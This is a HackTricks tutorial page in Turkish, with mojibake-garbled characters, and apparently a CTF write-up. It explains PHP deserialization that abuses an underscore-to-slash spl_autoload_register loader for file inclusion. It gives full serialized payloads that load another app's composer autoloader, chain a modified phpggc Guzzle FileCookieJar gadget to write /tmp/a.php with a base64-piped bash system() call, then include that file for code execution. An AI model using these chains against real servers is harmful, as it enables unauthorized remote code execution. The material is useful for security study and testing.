# PHP - Deserialization + Otomatik YÃ¼kleme SÄ±nÄ±flarÄ±

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

Ä°lk olarak, [**Otomatik YÃ¼kleme SÄ±nÄ±flarÄ±**](https://www.php.net/manual/en/language.oop5.autoload.php)'nÄ±n ne olduÄŸunu kontrol etmelisiniz.

## PHP deserialization + spl\_autoload\_register + LFI/Gadget

**Web uygulamasÄ±nda PHP deserializasyonu** bulduk, ancak **`phpggc`** iÃ§indeki gadgetlara karÅŸÄ± savunmasÄ±z bir kÃ¼tÃ¼phane yok. Bununla birlikte, aynÄ± konteynerde **savunmasÄ±z kÃ¼tÃ¼phanelere sahip farklÄ± bir composer web uygulamasÄ±** bulunuyordu. Bu nedenle, amacÄ±mÄ±z, deserializasyona karÅŸÄ± savunmasÄ±z olan web uygulamasÄ±nÄ±n **composer yÃ¼kleyicisini yÃ¼klemek** ve onu kullanarak deserializasyona karÅŸÄ± savunmasÄ±z olan kÃ¼tÃ¼phaneyi bir gadget ile sÃ¶mÃ¼rmek.

AdÄ±mlar:

* Bir **deserializasyon** buldunuz ve mevcut uygulama kodunda **hiÃ§bir gadget yok**
* AÅŸaÄŸÄ±daki gibi bir **`spl_autoload_register`** iÅŸlevini istediÄŸiniz herhangi bir yerel `.php` uzantÄ±lÄ± dosyayÄ± **yÃ¼klemek iÃ§in istismar edebilirsiniz**
* Bunun iÃ§in, sÄ±nÄ±fÄ±n adÄ± **`$name`** iÃ§inde olacak bir deserializasyonu kullanabilirsiniz. Bir seri nesnede sÄ±nÄ±f adÄ±nda "/" veya "." kullanamazsÄ±nÄ±z, ancak **kod**, **alt Ã§izgileri** ("\_") **eÄŸik Ã§izgilere** ("/") **dÃ¶nÃ¼ÅŸtÃ¼rÃ¼yor**. Bu nedenle, `tmp_passwd` gibi bir sÄ±nÄ±f adÄ± `/tmp/passwd.php`'ye dÃ¶nÃ¼ÅŸtÃ¼rÃ¼lecek ve kod onu yÃ¼klemeye Ã§alÄ±ÅŸacak.\
Bir **gadget Ã¶rneÄŸi** ÅŸu ÅŸekilde olabilir: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
{% hint style="success" %}
EÄŸer bir **dosya yÃ¼kleme** iÅŸlemi yapabilir ve **`.php` uzantÄ±lÄ±** bir dosya yÃ¼kleyebilirseniz, bu iÅŸlevselliÄŸi **doÄŸrudan kÃ¶tÃ¼ye kullanabilir** ve zaten RCE elde edebilirsiniz.
{% endhint %}

Benim durumumda bÃ¶yle bir ÅŸeyim yoktu, ancak **aynÄ± konteyner** iÃ§inde baÅŸka bir composer web sayfasÄ± vardÄ± ve bu sayfa **`phpggc` gadget'Ä±na** karÅŸÄ± savunmasÄ±z bir kÃ¼tÃ¼phane iÃ§eriyordu.

* Bu diÄŸer kÃ¼tÃ¼phaneyi yÃ¼klemek iÃ§in, Ã¶ncelikle **o diÄŸer web uygulamasÄ±nÄ±n composer yÃ¼kleyicisini yÃ¼klemeniz gerekmektedir** (Ã§Ã¼nkÃ¼ mevcut uygulamanÄ±n yÃ¼kleyicisi diÄŸer uygulamanÄ±n kÃ¼tÃ¼phanelerine eriÅŸemez). **UygulamanÄ±n yolunu bildiÄŸinizde**, bunu Ã§ok kolay bir ÅŸekilde yapabilirsiniz: **`O:28:"www_frontend_vendor_autoload":0:{}`** (Benim durumumda, composer yÃ¼kleyicisi `/www/frontend/vendor/autoload.php` iÃ§indeydi)
* Åimdi, diÄŸer uygulamanÄ±n composer yÃ¼kleyicisini **yÃ¼klÃ¼yoruz**, bu yÃ¼zden **`phpggc`** **payload**'Ä±nÄ± **oluÅŸturma zamanÄ±** geldi. Benim durumumda, **`Guzzle/FW1`**'i kullandÄ±m, bu da bana **dosya sistemi iÃ§inde herhangi bir dosya yazma** izni verdi.
* NOT: **OluÅŸturulan gadget Ã§alÄ±ÅŸmÄ±yordu**, Ã§alÄ±ÅŸmasÄ± iÃ§in phpggc'nin **`chain.php`** payload'Ä±nÄ± **deÄŸiÅŸtirdim** ve sÄ±nÄ±flarÄ±n **tÃ¼m Ã¶zniteliklerini private'dan public'a** ayarladÄ±m. Aksi takdirde, dizeden Ã§Ã¶zÃ¼mlendikten sonra oluÅŸturulan nesnelerin Ã¶zniteliklerinin herhangi bir deÄŸeri olmazdÄ±.
* Åimdi, diÄŸer uygulamanÄ±n composer yÃ¼kleyicisini **yÃ¼kleme yoluna sahibiz** ve Ã§alÄ±ÅŸan bir **phpggc payload'Ä±mÄ±z var**, ancak yÃ¼kleyicinin gadget kullanÄ±ldÄ±ÄŸÄ±nda yÃ¼klenmesi iÃ§in **BU Ä°STEKTE AYNI Ä°ÅLEMÄ° yapmamÄ±z gerekiyor**. Bunun iÃ§in, her iki nesneyi iÃ§eren bir seri hale getirilmiÅŸ dizi gÃ¶nderdim:
* **Ã–nce yÃ¼kleyicinin yÃ¼klendiÄŸini, ardÄ±ndan payload'Ä±n yÃ¼klendiÄŸini** gÃ¶rebilirsiniz.

{% code overflow="wrap" %}
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
{% endcode %}

* Åimdi, bir dosya oluÅŸturup yazabiliriz, ancak kullanÄ±cÄ± web sunucusunun iÃ§indeki herhangi bir klasÃ¶re yazamaz. Bu yÃ¼zden, payloadda gÃ¶rebileceÄŸiniz gibi, bazÄ± base64 ile PHP **`system`** Ã§aÄŸrÄ±sÄ± **`/tmp/a.php`** iÃ§inde oluÅŸturulur. ArdÄ±ndan, diÄŸer web uygulamasÄ±nÄ±n composer yÃ¼kleyicisini yÃ¼klemek iÃ§in LFI olarak kullandÄ±ÄŸÄ±mÄ±z ilk tÃ¼r payloadu yeniden kullanabiliriz. Sadece bunu deserialization gadget'a ekleyin:&#x20;

{% code overflow="wrap" %}
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
{% endcode %}

**Payload Ã¶zet**

* AynÄ± konteynerdeki baÅŸka bir web uygulamasÄ±nÄ±n **composer autoload'Ä±nÄ± yÃ¼kle**
* **phpggc gadget'Ä±nÄ± yÃ¼kle** ve diÄŸer web uygulamasÄ±nÄ±n bir kÃ¼tÃ¼phanesini kÃ¶tÃ¼ye kullan (deserialization aÃ§Ä±ÄŸÄ±na sahip olan baÅŸlangÄ±Ã§ web uygulamasÄ±nda herhangi bir gadget yoktu)
* Gadget, **kÃ¶tÃ¼ niyetli komutlar iÃ§eren bir PHP payload'uyla** /tmp/a.php adlÄ± bir dosya oluÅŸturacak (web uygulama kullanÄ±cÄ±sÄ± herhangi bir web uygulamasÄ±nÄ±n herhangi bir klasÃ¶rÃ¼ne yazamaz)
* Payload'Ä±mÄ±zÄ±n son kÄ±smÄ±, komutlarÄ± yÃ¼rÃ¼tecek olan **oluÅŸturulan php dosyasÄ±nÄ± yÃ¼klemek** iÃ§in kullanÄ±lacak

Bu deserialization'Ä± **iki kez Ã§aÄŸÄ±rmam gerekiyordu**. Testlerimde, ilk seferinde `/tmp/a.php` dosyasÄ± oluÅŸturuldu ancak yÃ¼klenmedi ve ikinci seferinde doÄŸru ÅŸekilde yÃ¼klendi.

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya HackTricks'i **PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>
